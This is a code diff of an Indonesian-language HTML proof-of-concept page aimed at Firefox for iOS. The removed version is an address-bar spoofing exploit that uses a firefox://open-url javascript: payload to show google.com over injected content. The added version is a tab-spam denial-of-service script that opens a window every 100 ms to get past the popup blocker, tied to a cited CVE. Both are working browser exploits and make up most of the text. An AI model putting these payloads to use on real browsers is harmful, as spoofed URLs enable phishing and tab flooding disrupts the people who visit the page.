@@ -1,34 +1,57 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Firefox iOS - URL Scheme Spoof PoC</title>
+    <title>Firefox iOS - Tab Spam DoS PoC</title>
     <meta charset="UTF-8">
 </head>
 <body>
-    <h1>Firefox iOS Bug PoC: Address Bar Spoofing</h1>
-    <p>Klik tombol di bawah untuk menguji spoofing address bar menggunakan firefox://open-url scheme.</p>
+    <h1>Firefox iOS DoS PoC: Popup Bypass</h1>
+    <p>⚠️ HATI-HATI: Ini bisa membuat browser crash atau sangat lambat</p>
     
-    <button onclick="exploit()" style="padding:15px;font-size:18px;background:red;color:white;border:none;border-radius:5px;">
-        Test Spoofing
+    <button onclick="startSpam()" style="padding:15px;font-size:18px;background:darkorange;color:white;border:none;border-radius:5px;">
+        Start Tab Spam Test
+    </button>
+    <button onclick="stopSpam()" style="padding:15px;font-size:18px;background:gray;color:white;border:none;border-radius:5px;">
+        Stop
     </button>
     
+    <p id="counter">Tabs opened: 0</p>
+    
     <script>
-        function exploit() {
-            // URL ini memanfaatkan firefox://open-url untuk menampilkan google.com
-            // di address bar padahal kontennya adalah HTML berbahaya
-            var payload = "firefox://open-url?url=javascript:" +
-                "//google.com%2Fsearch?q=secure%26source=%2F%250a" +
-                "document.body.innerHTML='<h1 style=color:red;font-size:48px>" +
-                "HACKED</h1><p>Address bar shows google.com but this is fake!</p>'";
+        var intervalId = null;
+        var count = 0;
+        
+        function startSpam() {
+            if (intervalId) return;
             
-            window.location.href = payload;
+            // Membuka banyak tab baru secara cepat untuk menguji 
+            // apakah popup blocker bisa di-bypass
+            intervalId = setInterval(function() {
+                var w = window.open('about:blank', '_blank', 'width=100,height=100');
+                if (w) {
+                    count++;
+                    document.getElementById('counter').textContent = 'Tabs opened: ' + count;
+                    w.document.write('<h1>Tab ' + count + '</h1>');
+                    
+                    // Jika terlalu banyak, coba tutup untuk mencegah crash total
+                    if (count > 50) {
+                        try { w.close(); } catch(e) {}
+                    }
+                }
+            }, 100); // 10 tabs per detik
+        }
+        
+        function stopSpam() {
+            if (intervalId) {
+                clearInterval(intervalId);
+                intervalId = null;
+                document.getElementById('counter').textContent = 'Stopped at: ' + count;
+            }
         }
     </script>
     
     <h2>Cara Kerja:</h2>
-    <p>1. Bug ini menggunakan skema URL <code>firefox://open-url</code></p>
-    <p>2. Parameter <code>javascript://google.com/...</code> membuat address bar</p>
-    <p>3. Tapi konten di-render dari skrip JavaScript, bukan dari google.com</p>
-    <p><strong>Catatan:</strong> Bug ini sudah dilaporkan dan sebagian sudah diperbaiki</p>
+    <p>Mengirim banyak <code>window.open()</code> secara cepat untuk menguji apakah</p>
+    <p>popup blocker Firefox iOS bisa dilewati (bypass) - CVE-2025-55029</p>
 </body>
 </html>
